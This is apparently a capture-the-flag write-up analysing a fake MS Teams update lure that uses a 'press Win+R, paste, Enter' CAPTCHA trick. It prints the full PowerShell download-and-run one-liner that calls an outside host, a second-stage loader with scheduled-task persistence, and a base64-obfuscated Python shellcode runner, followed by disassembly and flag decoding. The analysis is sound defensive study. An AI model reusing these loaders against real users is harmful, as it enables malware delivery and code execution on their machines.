## Chall description

```
Category: Malware
My computer said I needed to update MS Teams, so that is what I have been trying to do...

...but I can't seem to get past this CAPTCHA!
```

## Procedure
The first CAPTCHA step says `press Win+R, Ctrl+V and then push Enter`, after paste clipboard content we have 
```powershell
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://308a1862.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

This `Powershell` try to download a `ps1` file from `https://308a1862.proxy.coursestack.com:443/?tic=1`, we recover the following code
```powershell
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://308a1862.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

This try to download a fake `PDF` file, but in the same command we can see `System.IO.Compression.ZipFile`, this means the file is a `zip`, this have the following content
```bash
-rw-rw-r--@   1 sp34rh34d  staff    33861 Aug 14 15:30 LICENSE.txt
-rw-rw-r--@   1 sp34rh34d  staff    64344 Aug 14 15:30 _asyncio.pyd
-rw-rw-r--@   1 sp34rh34d  staff    83800 Aug 14 15:30 _bz2.pyd
-rw-rw-r--@   1 sp34rh34d  staff   120152 Aug 14 15:30 _ctypes.pyd
-rw-rw-r--@   1 sp34rh34d  staff   234328 Aug 14 15:30 _decimal.pyd
-rw-rw-r--@   1 sp34rh34d  staff   124248 Aug 14 15:30 _elementtree.pyd
-rw-rw-r--@   1 sp34rh34d  staff    55128 Aug 14 15:30 _hashlib.pyd
-rw-rw-r--@   1 sp34rh34d  staff   148312 Aug 14 15:30 _lzma.pyd
-rw-rw-r--@   1 sp34rh34d  staff    32600 Aug 14 15:30 _multiprocessing.pyd
-rw-rw-r--@   1 sp34rh34d  staff    46936 Aug 14 15:30 _overlapped.pyd
-rw-rw-r--@   1 sp34rh34d  staff    31568 Aug 14 15:30 _queue.pyd
-rw-rw-r--@   1 sp34rh34d  staff    76120 Aug 14 15:30 _socket.pyd
-rw-rw-r--@   1 sp34rh34d  staff   102232 Aug 14 15:30 _sqlite3.pyd
-rw-rw-r--@   1 sp34rh34d  staff   162648 Aug 14 15:30 _ssl.pyd
-rw-rw-r--@   1 sp34rh34d  staff    25944 Aug 14 15:30 _uuid.pyd
-rw-rw-r--@   1 sp34rh34d  staff    35160 Aug 14 15:30 _wmi.pyd
-rw-rw-r--@   1 sp34rh34d  staff    44376 Aug 14 15:30 _zoneinfo.pyd
-rw-------@   1 sp34rh34d  staff     1568 Sep  6 16:03 cpython-3134.pyc
-rw-rw-r--@   1 sp34rh34d  staff  3507568 Aug 14 15:30 libcrypto-3.dll
-rw-rw-r--@   1 sp34rh34d  staff    35088 Aug 14 15:30 libffi-8.dll
-rw-rw-r--@   1 sp34rh34d  staff   638456 Aug 14 15:30 libssl-3.dll
-rw-rw-r--@   1 sp34rh34d  staff     1503 Oct  1 16:51 output.py
-rw-rw-r--@   1 sp34rh34d  staff   177496 Aug 14 15:30 pyexpat.pyd
-rw-rw-r--@   1 sp34rh34d  staff   569510 Aug 14 15:30 python.cat
-rw-rw-r--@   1 sp34rh34d  staff   103768 Aug 14 15:30 python.exe
-rw-rw-r--@   1 sp34rh34d  staff    72024 Aug 14 15:30 python3.dll
drwx------@ 184 sp34rh34d  staff     5888 Oct  1 16:24 python313
-rw-rw-r--@   1 sp34rh34d  staff       80 Aug 14 15:31 python313._pth
-rw-rw-r--@   1 sp34rh34d  staff  5493592 Aug 14 15:30 python313.dll
-rw-rw-r--@   1 sp34rh34d  staff  3781453 Aug 14 15:31 python313.zip
-rw-rw-r--@   1 sp34rh34d  staff   102744 Aug 14 09:30 pythonw.pyc
-rw-rw-r--@   1 sp34rh34d  staff    30040 Aug 14 15:30 select.pyc
-rw-rw-r--@   1 sp34rh34d  staff  1297752 Aug 14 15:30 sqlite3.dll
-rw-rw-r--@   1 sp34rh34d  staff   703320 Aug 14 15:30 unicodedata.pyd
-rw-rw-r--@   1 sp34rh34d  staff    90192 Aug 14 15:30 vcruntime140.dll
-rw-rw-r--@   1 sp34rh34d  staff    29528 Aug 14 15:30 winsound.pyd
```
Here we can see an interesting `output.py` file with the following content

```python
import base64
#nfenru9en9vnebvnerbneubneubn
exec(base64.b64decode("aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp").decode('utf-8'))
#g0emgoemboemoetmboemomeio
```
The final base64 content is

```python
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```
**Python code description**
* Decrypts `base64+XOR-encoded` shellcode.
* Allocates RWX memory inside the process.
* Copies `shellcode` into that memory.
* Executes it directly → runs arbitrary machine code.

Using the same code, we can write the shellcode into `binary.bin` file:
```python
import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode("zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=="), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
open("binary.bin","wb").write(shellcode)
```

Using `ndisasm -b 32 binary.bin` we can see the following `ASM` code
```asm
00000000  55                push ebp
00000001  89E5              mov ebp,esp
00000003  81EC80000000      sub esp,0x80
00000009  6893D88484        push dword 0x8484d893
0000000E  6890C3C697        push dword 0x97c6c390
00000013  68C3909392        push dword 0x929390c3
00000018  6890C4C3C7        push dword 0xc7c3c490
0000001D  689C939C93        push dword 0x939c939c
00000022  68C09CC6C6        push dword 0xc6c69cc0
00000027  6897C69C93        push dword 0x939cc697
0000002C  6894C79DC1        push dword 0xc19dc794
00000031  68DEC19691        push dword 0x9196c1de
00000036  68C3C9C4C2        push dword 0xc2c4c9c3
0000003B  B90A000000        mov ecx,0xa
00000040  89E7              mov edi,esp
00000042  8137A5A5A5A5      xor dword [edi],0xa5a5a5a5
00000048  83C704            add edi,byte +0x4
0000004B  49                dec ecx
0000004C  75F4              jnz 0x42
0000004E  C644242600        mov byte [esp+0x26],0x0
00000053  C6857FFFFFFF00    mov byte [ebp-0x81],0x0
0000005A  89E6              mov esi,esp
0000005C  8D7D80            lea edi,[ebp-0x80]
0000005F  B926000000        mov ecx,0x26
00000064  8A06              mov al,[esi]
00000066  8807              mov [edi],al
00000068  46                inc esi
00000069  47                inc edi
0000006A  49                dec ecx
0000006B  75F7              jnz 0x64
0000006D  C60700            mov byte [edi],0x0
00000070  8D3C24            lea edi,[esp]
00000073  B940000000        mov ecx,0x40
00000078  B001              mov al,0x1
0000007A  8807              mov [edi],al
0000007C  47                inc edi
0000007D  49                dec ecx
0000007E  75FA              jnz 0x7a
00000080  C9                leave
00000081  C3                ret
```
**ASM Description**
* This push some data into `esp`
* Move `esp` into `edi`
* Make a `xor` operation with key:`a5`

Python code to decrypt the flag 
```python
def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

flag = xor_decrypt(bytes.fromhex("8484d89397c6c390929390c3c7c3c490939c939cc6c69cc0939cc697c19dc7949196c1dec2c4c9c3"),bytes.fromhex("a5"))
#the flag will be printed as revstr, so we can use [::-1]
print(flag[::-1])
```

Flag `flag{d341b8d2c96e9cc96965afbf5675fc26}!!`
